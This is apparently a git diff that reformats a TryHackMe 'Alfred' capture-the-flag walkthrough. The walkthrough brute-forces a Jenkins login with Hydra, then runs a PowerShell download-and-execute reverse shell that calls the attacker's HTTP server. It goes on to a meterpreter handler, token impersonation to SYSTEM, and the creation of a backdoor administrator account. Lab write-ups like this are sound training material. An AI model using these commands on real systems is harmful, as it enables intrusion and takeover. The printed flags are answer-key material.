@@ -2,7 +2,7 @@
 
 https://tryhackme.com/room/alfred
 
-###Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
+### Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
 
 ## F3d3r!c0 | Nov 23th, 2020
 _________________________________________________________
@@ -20,8 +20,9 @@ _________________________________________________________
 
 How many ports are open? (TCP only)
 
-    $sudo nmap -A -T4 <Target_IP> -oN nmap_alfred
-
+```
+$sudo nmap -A -T4 <Target_IP> -oN nmap_alfred
+```
 **Answer: 3**
 
 What is the username and password for the log in panel(in the format username:password)
@@ -29,21 +30,27 @@ What is the username and password for the log in panel(in the format username:pa
 Brute form http-post-form using hydra:
 
 Parameters for Hydra:
-
-**URL:** /j_acegi_security_check
-**USER** = j_username
-**PASS** = j_password
-**Port** = 8080
-**Invalid login message** = Invalid username or password
-
+```
+    URL: /j_acegi_security_check
+    USER = j_username
+    PASS = j_password
+    Port = 8080
+    Invalid login message = Invalid username or password
+```
+```
     hydra -s 8080 <Target_IP> http-form-post “/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password” -L user.txt -P rockyou.txt -t 10 -w 30
+```
 
 **Answer: admin:admin**
 
-Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
-
-You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server
-
+Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+```
+You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: 
+```
+python3 -m http.server
+```
 1. Login to webpage using gathered credentials
 
 ![Login](https://miro.medium.com/max/495/1*3B3vaSjDtkpEB4AcK_o5cA.png)
@@ -59,30 +66,23 @@ You first need to download the Powershell script, and make it available for the 
     $python -m SimpleHTTPServer 8000
 
 3. Download and run Invoke-PowerShellTcp.ps1 to target machine
-
+```
 powershell iex (New-Object Net.WebClient).DownloadString('http://<Local_IP>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <Local_IP> -Port 1337
-
-**PS C:\Program Files (x86)\Jenkins> type secret.key**
-**cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e**
-
+```
 
 **Answer: No answer need**
 
 What is the user.txt flag?
+```
+PS C:\Users\bruce\Desktop> dir
 
-    PS C:\Users\bruce\Desktop> dir
+    Directory: C:\Users\bruce\Desktop
+    Mode                LastWriteTime     Length Name                              
+    ----                -------------     ------ ---    -                              
+    a---        10/25/2019  11:22 PM         32 user.txt                          
 
-
-      Directory: C:\Users\bruce\Desktop
-
-
-        Mode                LastWriteTime     Length Name                              
-          ----                -------------     ------ ---    -                              
-            -a---        10/25/2019  11:22 PM         32 user.txt                          
-
-
-              PS C:\Users\bruce\Desktop> type user.txt
-
+PS C:\Users\bruce\Desktop> type user.txt
+```
 **Answer: 79007a09481963edf2e1321abd9ae2a0**
 
 ### [Task 2] Switching Shells
@@ -124,15 +124,16 @@ What is the final size of the exe payload that you generated?
 
 3.
 
-    msf6 > use exploit/multi/handler
-    [*] Using configured payload generic/shell_reverse_tcp
-    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-    PAYLOAD => windows/meterpreter/reverse_tcp
-    msf6 exploit(multi/handler) > set LHOST <Local_IP>
-    LHOST => <Local_IP>
-    msf6 exploit(multi/handler) > set LPORT 1234
-    msf6 exploit(multi/handler) > run
-
+```
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <Local_IP>
+LHOST => <Local_IP>
+msf6 exploit(multi/handler) > set LPORT 1234
+msf6 exploit(multi/handler) > run
+```
 4.
 
     PS C:\Users\bruce\Desktop> Start-Process "shell-name.exe"
@@ -151,37 +152,37 @@ Windows uses tokens to ensure that accounts have the right privileges to carry o
 
 This access token consists of:
 
-    * user SIDs(security identifier)
-    * group SIDs
-    * privileges
+* user SIDs(security identifier)
+* group SIDs
+* privileges
 
 amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).
 
 There are two types of access tokens:
 
-    * primary access tokens: those associated with a user account that are generated on log on
-    * impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
+* primary access tokens: those associated with a user account that are generated on log on
+* impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
 
 For an impersonation token, there are different levels:
 
-    * SecurityAnonymous: current user/client cannot impersonate another user/client
-    * SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
-    * SecurityImpersonation: current user/client can impersonate the client's security context on the local system
-    * SecurityDelegation: current user/client can impersonate the client's security context on a remote system
+* SecurityAnonymous: current user/client cannot impersonate another user/client
+* SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
+* SecurityImpersonation: current user/client can impersonate the client's security context on the local system
+* SecurityDelegation: current user/client can impersonate the client's security context on a remote system
 
 where the security context is a data structure that contains users' relevant security information.
 
 The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
 
-    * SeImpersonatePrivilege
-    * SeAssignPrimaryPrivilege
-    * SeTcbPrivilege
-    * SeBackupPrivilege
-    * SeRestorePrivilege
-    * SeCreateTokenPrivilege
-    * SeLoadDriverPrivilege
-    * SeTakeOwnershipPrivilege
-    * SeDebugPrivilege
+* SeImpersonatePrivilege
+* SeAssignPrimaryPrivilege
+* SeTcbPrivilege
+* SeBackupPrivilege
+* SeRestorePrivilege
+* SeCreateTokenPrivilege
+* SeLoadDriverPrivilege
+* SeTakeOwnershipPrivilege
+* SeDebugPrivilege
 
 There's more reading [here](https://www.exploit-db.com/papers/42556).
 _________________________________________________________
@@ -225,7 +226,7 @@ View all the privileges using whoami /priv
 **Answer: No answer need**
 
 You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: *load incognito* to load the incognito module in metasploit. Please note, you may need to use the *use incognito* command if the previous command doesn't work. Also ensure that your metasploit is up to date.
-
+```
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on <Local_IP>:1234
@@ -251,12 +252,12 @@ Impersonation Tokens Available
 NT AUTHORITY\ANONYMOUS LOGON
 
 meterpreter >
-
+```
 
 **Answer: No answer need**
 
 To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the *impersonate_token "BUILTIN\Administrators"* command to impersonate the Administrators token. What is the output when you run the *getuid* command?
-
+```
     meterpreter > impersonate_token "BUILTIN\Administrators"
     [-] Warning: Not currently running as SYSTEM, not all tokens will be available
              Call rev2self if primary process token is SYSTEM
@@ -265,7 +266,7 @@ To check which tokens are available, enter the list_tokens -g. We can see that t
     meterpreter > getuid
     Server username: NT AUTHORITY\SYSTEM
     meterpreter >
-
+```
 **Answer: NT AUTHORITY\SYSTEM**
 
 Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the *ps* command to view processes and find the PID of the services.exe process. Migrate to this process using the command *migrate PID-OF-PROCESS*
@@ -275,16 +276,18 @@ Even though you have a higher privileged token you may not actually have the per
 read the root.txt file at C:\Windows\System32\config
 
 1. download and unzip https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip
-
-
-    PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<Local_IP>:8000/incognito2/incognito.exe','incognito.exe')"
-    PS C:\Users\bruce\Desktop> ./incognito.exe add_user dummy pass123
-    PS C:\Users\bruce\Desktop> ./incognito.exe add_localgroup_user Administrators dummy
-
+```
+PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<Local_IP>:8000/incognito2/incognito.exe','incognito.exe')"
+PS C:\Users\bruce\Desktop> ./incognito.exe add_user dummy pass123
+PS C:\Users\bruce\Desktop> ./incognito.exe add_localgroup_user Administrators dummy
+```
 2. on Kali shell
-    $rdesktop -u dummy -p pass123 <Target_IP>
-
+```
+   $rdesktop -u dummy -p pass123 <Target_IP>
+```
 3. run cmd as Administrator
+
+
  ![Desktop](https://miro.medium.com/max/700/1*I_g6ea_ipdxnaWCrXFa9lA.png)    
 
 **Answer: dff0f748678f280250f25a45b8046b4a**
